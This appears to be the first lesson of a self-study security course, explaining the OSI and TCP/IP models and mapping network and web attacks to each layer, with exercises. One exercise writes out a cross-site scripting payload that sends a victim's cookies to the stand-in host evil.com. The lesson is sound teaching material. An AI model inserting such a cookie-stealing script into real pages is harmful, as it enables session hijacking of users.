---
title: "OSI Model — Layers, Purpose, and the Attacker Perspective"
tags: [foundation, networking, osi, tcp-ip, attacker-mindset]
module: 01-Foundation-01
day: 1
related_topics:
  - TCP/IP stack
  - Network scanning
  - Protocol analysis
  - Wireshark
---

# Day 001 — OSI Model: Layers, Purpose, and the Attacker Perspective

## Goals

By the end of this lesson you will be able to:

1. Name all seven OSI layers and state what each one does in one sentence.
2. Map real protocols (Ethernet, IP, TCP, HTTP, TLS) to their correct layers.
3. Explain why the OSI model exists and why it matters to an attacker.
4. Look at any attack or vulnerability and identify which OSI layer it targets.
5. Explain the difference between the OSI model and the TCP/IP model.

---

## Prerequisites

- Basic familiarity with the concept of a computer network (you know what a router and a switch do
  at a high level).
- No prior security knowledge required.

---

## Main Content

### 1. Why the OSI Model Exists

Before the OSI model, every vendor built their own networking stack. IBM's network did not talk to
DEC's network. The International Organisation for Standardisation (ISO) published the OSI model in
1984 as a reference framework — a common vocabulary that describes how data moves from one machine
to another, regardless of the underlying hardware or software.

It is a **conceptual** model. No protocol implements it exactly. What it gives you is a way to
reason about where in the communication stack something is happening. That is invaluable when you
are attacking or defending a system.

> **Ghost's rule:** When you encounter any attack, your first question is: *which layer is being
> abused?* The answer tells you where to look, what to log, and what to fix.

---

### 2. The Seven Layers

```
┌─────────────────────────────────────────────────────────────────┐
│  Layer 7 — Application   │  What the user or app sees           │
├─────────────────────────────────────────────────────────────────┤
│  Layer 6 — Presentation  │  Encoding, encryption, compression   │
├─────────────────────────────────────────────────────────────────┤
│  Layer 5 — Session       │  Establishing and managing sessions  │
├─────────────────────────────────────────────────────────────────┤
│  Layer 4 — Transport     │  End-to-end delivery, ports, flow    │
├─────────────────────────────────────────────────────────────────┤
│  Layer 3 — Network       │  Logical addressing, routing         │
├─────────────────────────────────────────────────────────────────┤
│  Layer 2 — Data Link     │  Node-to-node delivery, MAC frames   │
├─────────────────────────────────────────────────────────────────┤
│  Layer 1 — Physical      │  Bits on the wire / air              │
└─────────────────────────────────────────────────────────────────┘
```

Mnemonic (top to bottom): **All People Seem To Need Data Processing**
Mnemonic (bottom to top): **Please Do Not Throw Sausage Pizza Away**

Pick one. Burn it in.

---

### 3. Each Layer in Detail — with an Attacker Lens

#### Layer 1 — Physical

**What it does:** Transmits raw bits as electrical signals, light pulses, or radio waves. Cables,
fibre, Wi-Fi radios, and network interface card (NIC) hardware live here.

**Protocol Data Unit (PDU):** Bit

**Real hardware:** Ethernet cables (Cat5e/Cat6), fibre optic cables, Wi-Fi antennas, hubs.

**Attacker relevance:**
- Physical access to a cable = ability to tap it. A passive fibre tap is invisible to the network.
- Rogue Wi-Fi access points operate at this layer (the radio signal itself).
- Denial of service via signal jamming.
- Evil-maid attacks require physical layer access first.

---

#### Layer 2 — Data Link

**What it does:** Gets a frame from one node to the *directly connected* next node. Responsible
for MAC addressing, error detection (CRC), and frame delimiting. Split into two sub-layers:
Logical Link Control (LLC) and Media Access Control (MAC).

**PDU:** Frame

**Key protocols:** Ethernet (IEEE 802.3), Wi-Fi (IEEE 802.11), ARP, PPP, VLANs (802.1Q).

**Attacker relevance:**
- **ARP poisoning / spoofing:** ARP has no authentication. An attacker on the same network
  segment can broadcast fake ARP replies, associating their MAC with the gateway's IP. All
  traffic meant for the gateway flows through the attacker instead — classic Man-in-the-Middle.
- **MAC flooding:** Overwhelm a switch's CAM table with fake MAC addresses, forcing it to
  broadcast all frames like a hub. Every host on the segment sees every frame.
- **VLAN hopping:** 802.1Q double-tagging can allow an attacker on one VLAN to reach another.
- **Rogue DHCP:** A malicious DHCP server at layer 2 can redirect DNS and default gateway for
  every new device that joins the network.

---

#### Layer 3 — Network

**What it does:** Routes packets across multiple networks using logical (IP) addresses. Routers
operate here. Every hop a packet takes involves a layer-3 decision.

**PDU:** Packet

**Key protocols:** IPv4, IPv6, ICMP, IPSec, OSPF, BGP.

**Attacker relevance:**
- **IP spoofing:** Source IP fields in packets are not validated by default. An attacker can
  forge the source address for reflection/amplification DDoS attacks.
- **ICMP-based recon:** `ping` is a layer-3 tool. A ping sweep discovers live hosts. ICMP
  type/code analysis reveals OS characteristics.
- **BGP hijacking:** Border Gateway Protocol (layer 3/4 boundary) has minimal authentication.
  Nation-state actors have rerouted entire country's internet traffic by injecting false BGP
  routes (see: Rostelecom BGP hijack, 2020).
- **TTL manipulation:** Traceroute works by incrementing TTL to map routing hops. Attackers
  use this for network topology recon.
- **Fragmentation attacks:** Overlapping IP fragments can confuse older intrusion detection
  systems that reassemble packets differently from the end host.

---

#### Layer 4 — Transport

**What it does:** Provides end-to-end communication between processes on different hosts.
Multiplexes multiple application streams using **port numbers**. TCP adds reliability
(retransmission, ordering, flow control). UDP trades reliability for speed.

**PDU:** Segment (TCP) / Datagram (UDP)

**Key protocols:** TCP, UDP, SCTP.

**Attacker relevance:**
- **Port scanning:** Every service binds to a port. Scanning ports reveals what services are
  running (nmap operates primarily at this layer).
- **TCP SYN flood:** Send thousands of SYN packets without completing the three-way handshake.
  The server allocates a half-open connection for each one, exhausting resources.
- **TCP session hijacking:** If an attacker can predict sequence numbers, they can inject data
  into an existing TCP session.
- **UDP amplification DDoS:** Send small spoofed UDP requests to services that return large
  responses (DNS, NTP, memcached). The amplified traffic hits the spoofed victim.
- **Firewall evasion:** Many firewalls filter by port. Attackers use common ports (80, 443) for
  C2 traffic to blend in with legitimate web traffic.

---

#### Layer 5 — Session

**What it does:** Manages the setup, maintenance, and teardown of sessions between applications.
In modern practice this layer is largely absorbed into application-layer protocols.

**PDU:** Data

**Key protocols:** NetBIOS, RPC, PPTP (control channel), SMB session layer.

**Attacker relevance:**
- **Session fixation:** An attacker sets a known session ID before authentication; if the
  server doesn't issue a new session ID post-login, the attacker has a valid session.
- **SMB relay:** NTLM authentication over SMB can be captured and relayed without cracking the
  hash (Responder + ntlmrelayx).

---

#### Layer 6 — Presentation

**What it does:** Translates data between the application and the network. Handles encoding
(ASCII vs Unicode), serialisation formats, and encryption/decryption (TLS lives conceptually
here, though in practice it sits between layer 4 and 7).

**PDU:** Data

**Key protocols:** TLS/SSL, MIME, JPEG/PNG encoding.

**Attacker relevance:**
- **SSL stripping:** Downgrade an HTTPS connection to HTTP by intercepting the initial
  unencrypted request (sslstrip, Moxie Marlinspike, 2009).
- **Encoding attacks:** Representing `../` as `%2e%2e%2f` or double-encoding to bypass WAF
  rules that check for path traversal literally.
- **Serialisation vulnerabilities:** Deserialising attacker-controlled data (Java, PHP, Python
  pickle) can execute arbitrary code. The presentation layer handles serialisation.

---

#### Layer 7 — Application

**What it does:** Provides the interface between the network and the application. This is where
the user-facing protocols live.

**PDU:** Data (message)

**Key protocols:** HTTP/HTTPS, DNS, SMTP, FTP, SSH, SNMP, LDAP, SMB.

**Attacker relevance:** This is where most modern attacks live.
- **SQL injection, XSS, CSRF, SSRF, XXE:** All application-layer attacks.
- **DNS poisoning:** Corrupt the layer-7 name resolution process to redirect traffic.
- **Credential attacks:** Brute force, credential stuffing, password spraying all target
  application-layer authentication.
- **Protocol abuse:** SMTP open relays, SNMP default communities (`public`/`private`),
  anonymous LDAP bind, unauthenticated FTP.

---

### 4. The TCP/IP Model — What's Actually Used

The OSI model is a reference. The **TCP/IP model** (also called the Internet model) is what the
internet actually runs on. It collapses the seven layers into four:

```
OSI Layer(s)     →   TCP/IP Layer
─────────────────────────────────────────────
7, 6, 5          →   Application
4                →   Transport
3                →   Internet
2, 1             →   Network Access (Link)
```

When engineers say "layer 3" they almost always mean IP routing. When they say "layer 4" they
mean TCP/UDP. When you are reading CVEs, vendor advisories, or threat intelligence, the OSI
numbering is what you will encounter. Know both models. Understand they map onto each other.

---

### 5. Encapsulation — How Data Actually Moves

When you send an HTTP request, here is what happens layer by layer:

```
Application   →  HTTP request: "GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n"
                 ↓  wrapped by TLS (encryption)
Transport     →  TCP segment: source port 54231, dest port 443, seq/ack numbers, data
                 ↓  wrapped in TCP header
Network       →  IP packet: source IP 10.0.0.5, dest IP 93.184.216.34
                 ↓  wrapped in IP header
Data Link     →  Ethernet frame: source MAC aa:bb:cc:dd:ee:ff, dest MAC (gateway MAC)
                 ↓  wrapped in Ethernet header + CRC trailer
Physical      →  Electrical signals on Cat6 / radio waves on 802.11
```

At the receiving end, each layer **strips its own header** and passes the payload up. This is
called **decapsulation**.

**Why this matters for attackers:** Each header is data that can be forged, manipulated, or
inspected. A Wireshark capture shows you every header at every layer simultaneously. A good
attacker reads packet captures the way a mechanic reads an engine — they can see exactly what is
wrong and where.

---

### 6. Mapping Real Attacks to OSI Layers

| Attack | OSI Layer | What's Being Abused |
|--------|-----------|---------------------|
| ARP spoofing | 2 | No authentication on ARP replies |
| IP spoofing | 3 | Source IP field is not verified |
| TCP SYN flood | 4 | Half-open connection state exhaustion |
| SSL stripping | 6 | Downgrade from encrypted to plaintext |
| SQL injection | 7 | Unsanitised input in application protocol |
| DNS poisoning | 7 | Unauthenticated DNS responses (without DNSSEC) |
| BGP hijacking | 3/4 | No cryptographic route authentication |
| VLAN hopping | 2 | Double-tagged 802.1Q frames |
| Padding oracle | 6 | Error responses leak encryption state |
| Session fixation | 5/7 | Session ID not rotated post-authentication |

When you read about a new CVE, add it to your own version of this table. Over time, you will
start to see patterns — entire classes of bugs cluster at specific layers.

---

## Key Takeaways

1. The OSI model is a **vocabulary tool**. Every attack, every defence, every protocol sits at a
   specific layer. Knowing which layer tells you the scope of the problem.
2. **Layers 2, 3, and 4** are the network attacker's playground: ARP spoofing, IP spoofing,
   port scanning, SYN floods, and session hijacking all live here.
3. **Layer 7** is where most application security work happens — web vulns, credential attacks,
   protocol abuse.
4. **Encapsulation means trust.** Every layer trusts the layer below it to deliver the payload
   intact. When that trust is abused (spoofed headers, injected data), the attack works.
5. The **TCP/IP model** is what runs the internet. OSI is the reference for reasoning about it.
   Know both; they map to each other cleanly.
6. Your instinct on reading about any new vulnerability should be: *which layer, and what
   assumption did the protocol make that turned out to be wrong?*

---

## Exercises

### Exercise 1 — Layer Identification (No tools required)

For each item below, identify the OSI layer it belongs to and write one sentence explaining why:

1. An Ethernet frame's destination MAC address.
2. The source IP address in a packet header.
3. A TCP port number.
4. An HTTP `Cookie` header.
5. A TLS certificate.
6. A Wi-Fi radio signal.
7. A DNS `A` record response.
8. A TCP sequence number.

---

### Exercise 2 — Attack Layer Mapping

Read the description of each attack. Write down:
- Which OSI layer is being targeted.
- What protocol assumption the attack violates.

1. An attacker on a coffee shop Wi-Fi sends gratuitous ARP replies claiming their laptop's MAC
   is the router's IP address. Other guests' traffic starts flowing through the attacker's machine.

2. A web application reflects user input back in an HTML page without sanitisation. The attacker
   submits `<script>document.location='https://evil.com?c='+document.cookie</script>`.

3. An attacker sends 10 million UDP packets to port 53 of a public DNS resolver with the source
   IP forged to be the victim's IP. The resolver sends large responses to the victim.

4. A penetration tester runs `nmap -sS 10.0.0.0/24` against a network. What layer is nmap
   primarily operating at? What layer does it use to discover which hosts are alive?

---

### Exercise 3 — Encapsulation Trace

Draw the encapsulation stack for the following scenario:

> You open your browser and navigate to `https://example.com`. Your machine has IP `192.168.1.10`.
> The server's IP is `93.184.216.34`. Your gateway's MAC is `aa:bb:cc:11:22:33`.

For each layer, write what header/trailer is added and what key fields it contains.

---

### Lab Prep — Coming in Day 013

You will install Wireshark and capture live traffic on Day 013. Before then, make sure you can
answer this question cleanly: *when Wireshark shows you a packet, what are you actually looking
at?* The answer is every layer's headers, stacked exactly as described in section 5 above.

---

## Questions

<!-- Ghost's note: use this section to log your questions as you study.
     Ask Ghost to answer them, or write your own answer and ask for a review.
     Format: numbered ID, question, then answer block below. -->

### Open Questions

*(none yet — add yours here)*

---

### Answered Questions

*(none yet)*

---

*Next lesson: [Day 002 — IP Addressing and Subnetting](DAY-0002-IP-Addressing-and-Subnetting.md)*
